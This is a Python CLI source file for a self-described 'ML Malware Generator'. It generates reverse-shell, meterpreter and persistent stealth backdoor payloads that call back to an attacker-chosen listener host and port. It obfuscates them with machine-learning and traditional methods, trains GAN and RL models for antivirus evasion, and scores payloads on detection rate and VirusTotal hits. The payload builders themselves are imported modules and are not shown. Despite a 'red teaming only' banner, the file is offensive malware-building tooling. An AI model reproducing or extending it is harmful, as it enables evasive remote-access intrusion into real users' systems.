"""
ML Malware Generator - Command Line Interface
Main CLI for the ML malware generation system
"""
import click
import time
import json
from pathlib import Path
import numpy as np

from ml_engine import get_ml_engine
from generators.payload_factory import get_payload_factory
from obfuscation.obfuscator import get_obfuscator, get_encoder
from testing.detector import get_detector, get_functionality_tester, MetricsCalculator
from config.settings import (
    ml_config,
    payload_config,
    detection_config,
    safety_config,
    update_config,
)
from utils.logger import get_logger
from utils.crypto import get_crypto
from utils.payload_packer import get_packer
from generators.c2_templates import get_c2_factory
from evasion.evasion_techniques import get_evasion_orchestrator
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm

logger = get_logger()
console = Console()


@click.group()
@click.version_option(version="1.0.0")
def cli():
    """ML Malware Generator - Advanced payload generation with ML"""
    # Check safety controls
    if safety_config.require_authorization:
        console.print("[yellow]⚠ Safety controls enabled[/yellow]")
    
    console.print("[bold cyan]ML Malware Generator v1.0.0[/bold cyan]")
    console.print("[dim]For authorized red teaming and research only[/dim]\n")


@cli.command()
@click.option("--type", "-t", "payload_type", 
              type=click.Choice(["reverse_shell", "meterpreter", "backdoor"]),
              required=True, help="Type of payload to generate")
@click.option("--target", type=click.Choice(["windows", "linux", "android"]),
              default="windows", help="Target operating system")
@click.option("--arch", type=click.Choice(["x86", "x64"]),
              default="x64", help="Target architecture")
@click.option("--lhost", required=True, help="Listener host IP")
@click.option("--lport", type=int, required=True, help="Listener port")
@click.option("--obfuscate/--no-obfuscate", default=True, help="Apply obfuscation")
@click.option("--ml-mode/--no-ml-mode", default=False, help="Use ML for generation")
@click.option("--obfuscation-level", type=int, default=3, help="Obfuscation level (1-5)")
@click.option("--output", "-o", required=True, help="Output filename")
@click.option("--format", type=click.Choice(["exe", "dll", "elf", "raw"]),
              default="exe", help="Output format")
def generate(payload_type, target, arch, lhost, lport, obfuscate, ml_mode, 
             obfuscation_level, output, format):
    """Generate a payload"""
    
    logger.info(f"Generating {payload_type} for {target}/{arch}")
    logger.info(f"Configuration: LHOST={lhost}, LPORT={lport}")
    
    start_time = time.time()
    
    try:
        # Get factory
        factory = get_payload_factory()
        
        # Generate base payload
        if payload_type == "reverse_shell":
            payload, metadata = factory.generate_reverse_shell_tcp(
                lhost=lhost,
                lport=lport,
                target_os=target,
                architecture=arch,
            )
        elif payload_type == "meterpreter":
            payload, metadata = factory.generate_meterpreter_payload(
                lhost=lhost,
                lport=lport,
                target_os=target,
                architecture=arch,
                format=format,
            )
        elif payload_type == "backdoor":
            payload, metadata = factory.generate_backdoor(
                lhost=lhost,
                lport=lport,
                target_os=target,
                persistence=True,
                stealth=True,
            )
        
        # Apply ML obfuscation if requested
        if ml_mode:
            logger.info("Applying ML-based obfuscation...")
            ml_engine = get_ml_engine()
            
            # Convert payload to features
            payload_features = np.frombuffer(payload, dtype=np.uint8).astype(np.float32)
            payload_features = payload_features[:512]  # Truncate/pad to 512
            if len(payload_features) < 512:
                payload_features = np.pad(payload_features, (0, 512 - len(payload_features)))
            
            # Generate obfuscated version
            obfuscated_features, ml_metadata = ml_engine.generate_obfuscated_payload(
                payload_features,
                obfuscation_level=obfuscation_level,
                use_rl=True,
            )
            
            metadata["ml_obfuscation"] = ml_metadata
        
        # Apply traditional obfuscation
        if obfuscate:
            logger.info(f"Applying obfuscation (level={obfuscation_level})...")
            obfuscator = get_obfuscator()
            payload, obf_metadata = obfuscator.obfuscate_payload(
                payload,
                level=obfuscation_level,
            )
            metadata["obfuscation"] = obf_metadata
        
        # Add watermark (safety control)
        if safety_config.enable_watermark:
            crypto = get_crypto()
            watermark = crypto.generate_watermark(safety_config.watermark_signature)
            payload = crypto.embed_watermark(payload, watermark)
            metadata["watermarked"] = True
        
        # Save payload
        output_path = factory.save_payload(payload, output, metadata)
        
        generation_time = time.time() - start_time
        
        # Log generation
        logger.log_payload_generation(
            payload_type=payload_type,
            target_os=target,
            obfuscation_level=obfuscation_level if obfuscate else 0,
            success=True,
            metadata=metadata,
        )
        
        logger.success(f"Payload generated successfully: {output_path}")
        logger.info(f"Size: {len(payload)} bytes")
        logger.info(f"Generation time: {generation_time:.2f}s")
        
    except Exception as e:
        logger.error(f"Payload generation failed", exception=e)
        raise click.ClickException(str(e))


@cli.command()
@click.option("--payload", "-p", required=True, type=click.Path(exists=True),
              help="Payload file to evaluate")
@click.option("--virustotal/--no-virustotal", default=False,
              help="Use VirusTotal for analysis")
@click.option("--local-only", is_flag=True, help="Only use local analysis")
def evaluate(payload, virustotal, local_only):
    """Evaluate a payload for detection and functionality"""
    
    logger.info(f"Evaluating payload: {payload}")
    
    try:
        # Read payload
        with open(payload, 'rb') as f:
            payload_bytes = f.read()
        
        # Detect payload type from metadata
        metadata_path = Path(payload).with_suffix('.json')
        payload_type = "unknown"
        if metadata_path.exists():
            with open(metadata_path, 'r') as f:
                metadata = json.load(f)
                payload_type = metadata.get("type", "unknown")
        
        # Detection analysis
        detector = get_detector()
        detection_results = detector.analyze_payload(
            payload_bytes,
            use_virustotal=virustotal and not local_only,
            use_local=True,
        )
        
        # Functionality testing
        tester = get_functionality_tester()
        functionality_results = tester.test_payload_functionality(
            payload_bytes,
            payload_type=payload_type,
        )
        
        # Calculate metrics
        metrics = MetricsCalculator.calculate_metrics(
            detection_results,
            functionality_results,
            generation_time=0.0,
        )
        
        # Display results
        click.echo("\n" + "="*60)
        click.echo("EVALUATION RESULTS")
        click.echo("="*60)
        click.echo(f"Payload: {payload}")
        click.echo(f"Size: {detection_results['payload_size']} bytes")
        click.echo(f"Hash: {detection_results['payload_hash']}")
        click.echo("\nDetection Analysis:")
        click.echo(f"  Detection Rate: {metrics['detection_rate']:.1%}")
        click.echo(f"  Stealth Score: {metrics['stealth_score']:.1%}")
        
        if "local_analysis" in detection_results:
            local = detection_results["local_analysis"]
            click.echo(f"  Entropy: {local['entropy']:.2f}")
            click.echo(f"  File Type: {local['file_type']}")
            click.echo(f"  Packed: {local['packed']}")
            if local.get("detection_flags"):
                click.echo(f"  Flags: {', '.join(local['detection_flags'])}")
        
        if "virustotal" in detection_results and "detection_rate" in detection_results["virustotal"]:
            vt = detection_results["virustotal"]
            click.echo(f"\nVirusTotal:")
            click.echo(f"  Detection: {vt['detections']}/{vt['total_engines']} ({vt['detection_rate']:.1%})")
        
        click.echo(f"\nFunctionality:")
        click.echo(f"  Tests Passed: {functionality_results['tests_passed']}")
        click.echo(f"  Tests Failed: {functionality_results['tests_failed']}")
        click.echo(f"  Functionality Score: {metrics['functionality_score']:.1%}")
        
        click.echo(f"\nOverall:")
        click.echo(f"  Overall Score: {metrics['overall_score']:.1%}")
        click.echo(f"  Success: {'✓' if metrics['success'] else '✗'}")
        click.echo("="*60 + "\n")
        
        # Save results
        results_path = Path(payload).with_suffix('.results.json')
        with open(results_path, 'w') as f:
            json.dump({
                "detection": detection_results,
                "functionality": functionality_results,
                "metrics": metrics,
            }, f, indent=2)
        
        logger.info(f"Results saved to {results_path}")
        
    except Exception as e:
        logger.error(f"Evaluation failed", exception=e)
        raise click.ClickException(str(e))


@cli.command()
@click.option("--model", type=click.Choice(["gan", "rl", "transformer", "all"]),
              required=True, help="Model to train")
@click.option("--epochs", type=int, default=100, help="Number of epochs")
@click.option("--timesteps", type=int, default=50000, help="RL timesteps")
def train(model, epochs, timesteps):
    """Train ML models"""
    
    logger.info(f"Training {model} model...")
    
    try:
        ml_engine = get_ml_engine()
        
        if model == "all":
            logger.info("Training all models...")
            ml_engine.train_all_models(
                rl_timesteps=timesteps,
            )
        elif model == "rl":
            logger.info(f"Training RL agent for {timesteps} timesteps...")
            ml_engine.rl_agent.train(total_timesteps=timesteps)
        elif model == "gan":
            logger.info(f"Training GAN for {epochs} epochs...")
            # Would need training data
            logger.warning("GAN training requires dataset - skipping")
        elif model == "transformer":
            logger.info("Training Transformer...")
            # Would need training data
            logger.warning("Transformer training requires dataset - skipping")
        
        # Save models
        ml_engine.save_all_models(checkpoint_name="latest")
        
        logger.success("Training completed successfully")
        
    except Exception as e:
        logger.error(f"Training failed", exception=e)
        raise click.ClickException(str(e))


@cli.command()
def info():
    """Display system information"""
    
    try:
        ml_engine = get_ml_engine()
        model_info = ml_engine.get_model_info()
        
        click.echo("\n" + "="*60)
        click.echo("ML MALWARE GENERATOR - SYSTEM INFO")
        click.echo("="*60)
        
        click.echo("\nML Configuration:")
        click.echo(f"  Device: {ml_config.device}")
        click.echo(f"  GAN Latent Dim: {ml_config.gan_latent_dim}")
        click.echo(f"  RL Algorithm: {ml_config.rl_algorithm}")
        click.echo(f"  Transformer Model: {ml_config.transformer_model}")
        
        click.echo("\nPayload Configuration:")
        click.echo(f"  Supported Types: {', '.join(payload_config.payload_types)}")
        click.echo(f"  Obfuscation Level: {payload_config.obfuscation_level}")
        click.echo(f"  AV Evasion: {payload_config.enable_av_evasion}")
        
        click.echo("\nSafety Controls:")
        click.echo(f"  Watermarking: {safety_config.enable_watermark}")
        click.echo(f"  Kill Switch: {safety_config.enable_kill_switch}")
        click.echo(f"  Mandatory Logging: {safety_config.mandatory_logging}")
        
        click.echo("="*60 + "\n")
        
    except Exception as e:
        logger.error(f"Failed to get info", exception=e)
        raise click.ClickException(str(e))


if __name__ == "__main__":
    cli()


